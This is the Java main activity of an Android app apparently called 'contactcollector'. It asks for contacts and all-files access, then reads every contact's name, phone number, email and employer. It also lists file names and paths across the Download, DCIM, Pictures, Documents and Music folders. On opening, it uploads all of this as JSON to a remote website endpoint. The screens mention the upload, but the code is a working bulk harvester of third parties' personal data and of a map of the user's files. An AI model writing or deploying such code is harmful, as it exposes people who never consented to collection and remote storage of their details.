package com.contactcollector.app;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {

    // IMPORTANT: Change this to your deployed website URL
    private static final String WEBSITE_BASE_URL = "https://your-website-url.vercel.app";
    private static final int CONTACTS_PERMISSION_CODE = 100;
    private static final int FILES_PERMISSION_CODE = 101;

    private TextView tvStatus;
    private TextView tvDetail;
    private ProgressBar progressBar;
    private Button btnAllow;
    private Button btnViewWebsite;
    private LinearLayout layoutSuccess;
    private LinearLayout layoutPermission;
    private LinearLayout layoutLoading;

    private String viewUrl = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvStatus = findViewById(R.id.tvStatus);
        tvDetail = findViewById(R.id.tvDetail);
        progressBar = findViewById(R.id.progressBar);
        btnAllow = findViewById(R.id.btnAllow);
        btnViewWebsite = findViewById(R.id.btnViewWebsite);
        layoutSuccess = findViewById(R.id.layoutSuccess);
        layoutPermission = findViewById(R.id.layoutPermission);
        layoutLoading = findViewById(R.id.layoutLoading);

        btnAllow.setOnClickListener(v -> requestPermissions());

        btnViewWebsite.setOnClickListener(v -> {
            if (viewUrl != null) {
                startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(viewUrl)));
            }
        });

        // Auto-check permission on open
        if (hasAllPermissions()) {
            readAndUploadData();
        } else {
            showPermissionScreen();
        }
    }

    private boolean hasAllPermissions() {
        boolean contactsOk = checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
        boolean filesOk;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            filesOk = Environment.isExternalStorageManager();
        } else {
            filesOk = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
        return contactsOk && filesOk;
    }

    private void showPermissionScreen() {
        layoutPermission.setVisibility(View.VISIBLE);
        layoutLoading.setVisibility(View.GONE);
        layoutSuccess.setVisibility(View.GONE);
    }

    private void requestPermissions() {
        // Request contacts permission
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, CONTACTS_PERMISSION_CODE);
        } else {
            // Contacts already granted, request files
            requestFilePermission();
        }
    }

    private void requestFilePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, FILES_PERMISSION_CODE);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivityForResult(intent, FILES_PERMISSION_CODE);
                }
            } else {
                readAndUploadData();
            }
        } else {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, FILES_PERMISSION_CODE);
            } else {
                readAndUploadData();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == CONTACTS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                requestFilePermission();
            } else {
                tvStatus.setText("Contact Permission Denied");
                tvDetail.setText("Contact permission is required. Please try again and tap Allow.");
            }
        } else if (requestCode == FILES_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                readAndUploadData();
            } else {
                tvStatus.setText("File Permission Denied");
                tvDetail.setText("File manager permission is required. Please try again and tap Allow.");
            }
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == FILES_PERMISSION_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    readAndUploadData();
                } else {
                    tvStatus.setText("File Permission Denied");
                    tvDetail.setText("File manager permission is required. Please try again.");
                }
            }
        }
    }

    private void readAndUploadData() {
        layoutPermission.setVisibility(View.GONE);
        layoutLoading.setVisibility(View.VISIBLE);
        layoutSuccess.setVisibility(View.GONE);
        tvStatus.setText("Reading Data...");
        tvDetail.setText("Reading contacts & files from your phone");

        new Thread(() -> {
            try {
                JSONArray contactsArray = readAllContacts();
                JSONArray filesArray = readAllFiles();

                runOnUiThread(() -> {
                    tvStatus.setText("Uploading Data...");
                    tvDetail.setText("Sending " + contactsArray.length() + " contacts & " + filesArray.length() + " files to website...");
                });

                String result = uploadData(contactsArray, filesArray);

                if (result != null) {
                    JSONObject json = new JSONObject(result);
                    String sessionId = json.getString("id");
                    int contactCount = json.getInt("contactCount");
                    int fileCount = json.getInt("fileCount");
                    viewUrl = WEBSITE_BASE_URL + "/view/" + sessionId;

                    runOnUiThread(() -> {
                        layoutLoading.setVisibility(View.GONE);
                        layoutSuccess.setVisibility(View.VISIBLE);
                        tvStatus.setText("Data Uploaded!");
                        tvDetail.setText(contactCount + " contacts & " + fileCount + " files sent to website.\n\nTap 'View on Website' to see everything.");
                        btnViewWebsite.setVisibility(View.VISIBLE);
                    });
                } else {
                    showError("Upload failed. Please check your internet connection.");
                }
            } catch (Exception e) {
                showError("Error: " + e.getMessage());
            }
        }).start();
    }

    private void showError(String msg) {
        runOnUiThread(() -> {
            layoutLoading.setVisibility(View.GONE);
            layoutPermission.setVisibility(View.VISIBLE);
            tvStatus.setText("Error");
            tvDetail.setText(msg);
            btnAllow.setText("Try Again");
        });
    }

    private JSONArray readAllContacts() throws Exception {
        JSONArray contactsArray = new JSONArray();

        String[] projection = {
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER
        };

        android.database.Cursor cursor = getContentResolver().query(
            ContactsContract.Contacts.CONTENT_URI,
            projection,
            null,
            null,
            ContactsContract.Contacts.DISPLAY_NAME + " ASC"
        );

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String id = cursor.getString(0);
                String name = cursor.getString(1);
                int hasPhone = cursor.getInt(2);

                if (hasPhone > 0) {
                    String phone = "";
                    android.database.Cursor phoneCursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id},
                        null
                    );
                    if (phoneCursor != null && phoneCursor.moveToFirst()) {
                        int phoneIdx = phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                        if (phoneIdx >= 0) phone = phoneCursor.getString(phoneIdx);
                        phoneCursor.close();
                    }

                    if (!phone.isEmpty()) {
                        JSONObject contact = new JSONObject();
                        contact.put("id", id);
                        contact.put("name", name);
                        contact.put("phone", phone);

                        String email = null;
                        android.database.Cursor emailCursor = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{id},
                            null
                        );
                        if (emailCursor != null && emailCursor.moveToFirst()) {
                            int emailIdx = emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA);
                            if (emailIdx >= 0) email = emailCursor.getString(emailIdx);
                            emailCursor.close();
                        }
                        if (email != null) contact.put("email", email);

                        String org = null;
                        android.database.Cursor orgCursor = getContentResolver().query(
                            ContactsContract.Data.CONTENT_URI,
                            null,
                            ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?",
                            new String[]{id, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE},
                            null
                        );
                        if (orgCursor != null && orgCursor.moveToFirst()) {
                            int orgIdx = orgCursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY);
                            if (orgIdx >= 0) org = orgCursor.getString(orgIdx);
                            orgCursor.close();
                        }
                        if (org != null) contact.put("organization", org);

                        contactsArray.put(contact);
                    }
                }
            }
            cursor.close();
        }

        return contactsArray;
    }

    private JSONArray readAllFiles() throws Exception {
        JSONArray filesArray = new JSONArray();

        // Read files from Downloads, DCIM, Pictures, Documents, Music folders
        String[] storagePaths = {
            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Download",
            Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM",
            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Pictures",
            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Documents",
            Environment.getExternalStorageDirectory().getAbsolutePath() + "/Music",
        };

        for (String path : storagePaths) {
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                scanDirectory(dir, filesArray, 0, 3); // max depth 3
            }
        }

        return filesArray;
    }

    private void scanDirectory(File dir, JSONArray filesArray, int depth, int maxDepth) throws Exception {
        if (depth > maxDepth) return;

        File[] files = dir.listFiles();
        if (files == null) return;

        for (File file : files) {
            try {
                JSONObject fileInfo = new JSONObject();
                fileInfo.put("name", file.getName());
                fileInfo.put("path", file.getAbsolutePath());
                fileInfo.put("isDirectory", file.isDirectory());
                fileInfo.put("size", file.length());
                fileInfo.put("lastModified", file.lastModified());

                if (!file.isDirectory()) {
                    String name = file.getName().toLowerCase();
                    String type = "other";
                    if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".gif") || name.endsWith(".webp"))
                        type = "image";
                    else if (name.endsWith(".mp4") || name.endsWith(".avi") || name.endsWith(".mkv") || name.endsWith(".3gp"))
                        type = "video";
                    else if (name.endsWith(".mp3") || name.endsWith(".wav") || name.endsWith(".flac") || name.endsWith(".ogg"))
                        type = "audio";
                    else if (name.endsWith(".pdf"))
                        type = "pdf";
                    else if (name.endsWith(".doc") || name.endsWith(".docx") || name.endsWith(".txt"))
                        type = "document";
                    else if (name.endsWith(".apk"))
                        type = "apk";
                    else if (name.endsWith(".vcf"))
                        type = "vcf";
                    fileInfo.put("fileType", type);
                } else {
                    fileInfo.put("fileType", "folder");
                }

                filesArray.put(fileInfo);

                // Recurse into directories
                if (file.isDirectory() && depth < maxDepth) {
                    scanDirectory(file, filesArray, depth + 1, maxDepth);
                }
            } catch (Exception e) {
                // Skip problematic files
            }
        }
    }

    private String uploadData(JSONArray contacts, JSONArray files) throws Exception {
        JSONObject payload = new JSONObject();
        payload.put("contacts", contacts);
        payload.put("files", files);

        URL url = new URL(WEBSITE_BASE_URL + "/api/contacts/upload");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(60000);

        OutputStream os = conn.getOutputStream();
        os.write(payload.toString().getBytes("UTF-8"));
        os.close();

        int responseCode = conn.getResponseCode();
        BufferedReader br;
        if (responseCode >= 200 && responseCode < 300) {
            br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        } else {
            br = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
        }

        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line);
        br.close();

        if (responseCode >= 200 && responseCode < 300) {
            return sb.toString();
        }
        return null;
    }
}
